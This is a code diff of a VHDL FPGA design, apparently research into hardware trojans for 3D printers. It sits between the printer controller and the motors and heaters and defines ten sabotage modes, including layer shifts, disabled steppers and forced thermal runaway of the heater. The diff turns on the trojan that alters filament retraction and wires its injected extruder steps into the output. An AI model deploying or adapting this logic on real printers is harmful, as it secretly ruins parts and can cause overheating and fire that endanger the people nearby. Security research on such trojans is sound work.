@@ -12,9 +12,9 @@ entity TROJAN_TOP is
         i_D10       : in std_logic;  
         i_D8        : in std_logic;  
         i_D9        : in std_logic;  
-        i_E0_DIR    : in std_logic;
-        i_E0_EN     : in std_logic;
-        i_E0_STEP   : in std_logic;
+        i_E_DIR    : in std_logic;
+        i_E_EN     : in std_logic;
+        i_E_STEP   : in std_logic;
         i_X_DIR     : in std_logic; 
         i_X_EN      : in std_logic; 
         i_X_MIN     : in std_logic; 
@@ -32,9 +32,9 @@ entity TROJAN_TOP is
         o_D10       : out std_logic;  
         o_D9        : out std_logic;  
         o_D8        : out std_logic;  
-        o_E0_DIR    : out std_logic;
-        o_E0_EN     : out std_logic;
-        o_E0_STEP   : out std_logic;
+        o_E_DIR    : out std_logic;
+        o_E_EN     : out std_logic;
+        o_E_STEP   : out std_logic;
         o_X_DIR     : out std_logic; 
         o_X_EN      : out std_logic; 
         o_X_MIN     : out std_logic; 
@@ -112,14 +112,14 @@ architecture Behavioral of Trojan_TOP is
     -- Temporarily we will set the enabled trojans here, hardcoded. Vivado will optimize out the unused ones.
     signal TROJ_T1_ENABLE : std_logic := '0'; -- Adds steps from X or Y axis during move
     signal TROJ_T2_ENABLE : std_logic := '0'; -- Constant over / under extrusion per print
-    signal TROJ_T3_ENABLE : std_logic := '0'; -- Increases or decreases filament retraction between layers
+    signal TROJ_T3_ENABLE : std_logic := '1'; -- Increases or decreases filament retraction between layers
     signal TROJ_T4_ENABLE : std_logic := '0'; -- Small Shift along X and Y axis on random Z layer increment
     signal TROJ_T5_ENABLE : std_logic := '0'; -- Denial of service via disabling D8/D10 heating element power
     signal TROJ_T6_ENABLE : std_logic := '0'; -- Forcing thermal runaway and further overheating
     signal TROJ_T7_ENABLE : std_logic := '0'; -- Layer Delamination via Z-layer shift
     signal TROJ_T8_ENABLE : std_logic := '0'; -- Arbitrarily deactivating stepper motors via EN signals
     signal TROJ_T9_ENABLE : std_logic := '0'; -- Arbitrarily reducing part fan speed mid-print
-    signal TROJ_T10_ENABLE : std_logic := '0'; -- Arbitrarily shifting prints by actuating endstops
+    signal TROJ_T10_ENABLE: std_logic := '0'; -- Arbitrarily shifting prints by actuating endstops
 
     type State_Type is (IDLE, STATE_1, STATE_2, STATE_3, STATE_4, STATE_5, DISABLE);
 
@@ -160,7 +160,7 @@ architecture Behavioral of Trojan_TOP is
     -- Trojan 8 Related Signals 
     signal T8_STATE, T8_NEXT_STATE: State_Type := IDLE;
     signal TROJ_T8_COUNTER : std_logic_vector (33 downto 0) := (others=>'0');
-    signal TROJ_T8_E0_EN_MOD : std_logic := '0';
+    signal TROJ_T8_E_EN_MOD : std_logic := '0';
     signal TROJ_T8_X_EN_MOD  : std_logic := '0';
     signal TROJ_T8_Y_EN_MOD  : std_logic := '0';
     signal TROJ_T8_Z_EN_MOD  : std_logic := '0';
@@ -175,7 +175,7 @@ begin
     X_STEP_EDGE_DETECT : EDGE_DETECTOR PORT  MAP(i_clk => i_CLK, i_input => i_X_STEP,  o_rising => X_STEP_EDGE, o_falling => open);
     Y_STEP_EDGE_DETECT : EDGE_DETECTOR PORT  MAP(i_clk => i_CLK, i_input => i_Y_STEP,  o_rising => Y_STEP_EDGE, o_falling => open);
     Z_STEP_EDGE_DETECT : EDGE_DETECTOR PORT  MAP(i_clk => i_CLK, i_input => i_Z_STEP,  o_rising => open, o_falling => Z_STEP_EDGE);
-    E_STEP_EDGE_DETECT : EDGE_DETECTOR PORT  MAP(i_clk => i_CLK, i_input => i_E0_STEP, o_rising => open, o_falling => E_STEP_EDGE);
+    E_STEP_EDGE_DETECT : EDGE_DETECTOR PORT  MAP(i_clk => i_CLK, i_input => i_E_STEP, o_rising => open, o_falling => E_STEP_EDGE);
     
     -- Pulse Generators
     X_PULSE_GEN : PULSE_GEN PORT MAP (i_CLK => i_CLK, i_PULSE_EN => X_PULSE_EN, i_PULSES_TO_SEND => PULSES_PER_STEP, o_PULSE_SIG => X_STEP_MOD, o_COMPLETE => X_STEP_COMPLETE);
@@ -187,10 +187,10 @@ begin
     -- For testing the output of the pulse gen in trojan mode
     -- This part of the code should countinously move the X axis when bypass mode is turned off 
     -- DONE: I have tested this and confirm the pulse gen works in standalone
---    o_E0_DIR  <= '1';  
---    o_E0_EN   <= '0';   
+--    o_E_DIR  <= '1';  
+--    o_E_EN   <= '0';   
 ----    o_X_MIN  <= i_X_MIN;  
---    o_E0_STEP <=   E_STEP_MOD;
+--    o_E_STEP <=   E_STEP_MOD;
 
 --    Pulse_Test_proc : process (i_CLK)
 --    begin
@@ -207,9 +207,9 @@ begin
     o_D9        <= i_D9     ; -- Fan
     o_D8        <= i_D8     ; -- Heat Bed
 
-    o_E0_DIR    <= i_E0_DIR ;
-    o_E0_EN     <= i_E0_EN  ;
-    o_E0_STEP   <= i_E0_STEP;   
+    o_E_DIR    <= i_E_DIR ;
+    o_E_EN     <= i_E_EN  ;
+--    o_E_STEP   <= i_E_STEP;   
 
     o_X_DIR     <= i_X_DIR  ;
     o_X_EN      <= i_X_EN   ;   
@@ -231,10 +231,10 @@ begin
     -- o_Y_STEP    <= i_Y_STEP when TROJ_T1_ENABLE = '0' else (i_Y_STEP or Y_STEP_MOD);  
 
     -- Trojan 2 Related Signals 
-    -- o_E0_STEP   <= i_E0_STEP when TROJ_T2_ENABLE = '0' else (i_E0_STEP and TROJ_T2_MATCH_INPUT);
+    -- o_E_STEP   <= i_E_STEP when TROJ_T2_ENABLE = '0' else (i_E_STEP and TROJ_T2_MATCH_INPUT);
     
     -- Trojan 3 Related Signals 
-    -- o_E0_STEP   <= i_E0_STEP when TROJ_T3_ENABLE = '0' else (i_E0_STEP or E_STEP_MOD);   
+     o_E_STEP   <= i_E_STEP when TROJ_T3_ENABLE = '0' else (i_E_STEP or E_STEP_MOD);   
         
     -- Trojan 4 Related Signals 
     -- o_Y_STEP    <= i_Y_STEP when TROJ_T4_ENABLE = '0' else (i_Y_STEP or Y_STEP_MOD);
@@ -250,7 +250,7 @@ begin
     -- o_Z_STEP    <= i_Z_STEP when TROJ_T7_ENABLE = '0' else (i_Z_STEP or Z_STEP_MOD);
 
     -- Trojan 8 Related Signals 
-    -- o_E0_EN    <= i_E0_EN when TROJ_T8_ENABLE = '0' else (i__E0_EN or TROJ_T8_E0_EN_MOD); 
+    -- o_E_EN    <= i_E_EN when TROJ_T8_ENABLE = '0' else (i__E_EN or TROJ_T8_E_EN_MOD); 
     -- o_X_EN     <= i_X_EN  when TROJ_T8_ENABLE = '0' else (i__X_EN  or TROJ_T8_X_EN_MOD);
     -- o_Y_EN     <= i_Y_EN  when TROJ_T8_ENABLE = '0' else (i__Y_EN  or TROJ_T8_Y_EN_MOD);
     -- o_Z_EN     <= i_Z_EN  when TROJ_T8_ENABLE = '0' else (i__Z_EN  or TROJ_T8_Z_EN_MOD);
@@ -360,18 +360,18 @@ begin
     -- decreases filament retraction between layers
     trojan_t3_proc : process (i_CLK)
     begin
-        if rising_edge(i_CLK) then -- and homing_complete = '1') then
+        if rising_edge(i_CLK) then 
             T3_STATE <= T3_NEXT_STATE;
             case T3_STATE is
                 when IDLE =>
-                    if (TROJ_T3_ENABLE = '1' ) then--and homing_complete = '1') then
+                    if (TROJ_T3_ENABLE = '1' and homing_complete = '1') then
                         T3_NEXT_STATE <= STATE_1;
                     else
                         T3_NEXT_STATE <= DISABLE;
                     end if;
 
                 when STATE_1 => -- Wait for a certain number of z steps
-                    if (TROJ_T3_Z_PULSE_COUNT = X"32") then -- 0x32 == 50 steps
+                    if (TROJ_T3_Z_PULSE_COUNT = "10100") then -- 0x32 == 50 steps
                         TROJ_T3_Z_PULSE_COUNT <= X"00";
                         T3_NEXT_STATE <= STATE_2;
                     else 
@@ -393,7 +393,6 @@ begin
 
                 when DISABLE => -- Turn off signals here
                     TROJ_T3_Z_PULSE_COUNT <= (others=>'0'); 
-                    E_PULSE_EN <= '0';
                     T3_NEXT_STATE <= IDLE;
             end case;
         end if;
@@ -438,7 +437,6 @@ begin
 
                 when DISABLE => -- Turn off signals here
                     TROJ_T4_Z_PULSE_COUNT <= (others=>'0'); 
-                    E_PULSE_EN <= '0';
                     T4_NEXT_STATE <= IDLE;
             end case;
         end if;
@@ -513,7 +511,7 @@ begin
                         T6_NEXT_STATE <= STATE_1;
                     end if;
                     
-                when STATE_2 => -- Permanently turn on E0 Heater
+                when STATE_2 => -- Permanently turn on E Heater
                     TROJ_T6_D10_MOD <= '0'; 
                     T6_NEXT_STATE <= STATE_3;
 
@@ -611,7 +609,7 @@ begin
                     end if;
 
                 when STATE_2 => 
-                    TROJ_T8_E0_EN_MOD <= '1';
+                    TROJ_T8_E_EN_MOD <= '1';
                     TROJ_T8_X_EN_MOD  <= '1';
                     TROJ_T8_Y_EN_MOD  <= '1';
                     TROJ_T8_Z_EN_MOD  <= '1';
@@ -624,7 +622,7 @@ begin
                 when STATE_5 => T8_NEXT_STATE <= DISABLE; -- Unused
 
                 when DISABLE => -- Turn off signals here
-                    TROJ_T8_E0_EN_MOD <= '0';
+                    TROJ_T8_E_EN_MOD <= '0';
                     TROJ_T8_X_EN_MOD  <= '0';
                     TROJ_T8_Y_EN_MOD  <= '0';
                     TROJ_T8_Z_EN_MOD  <= '0';
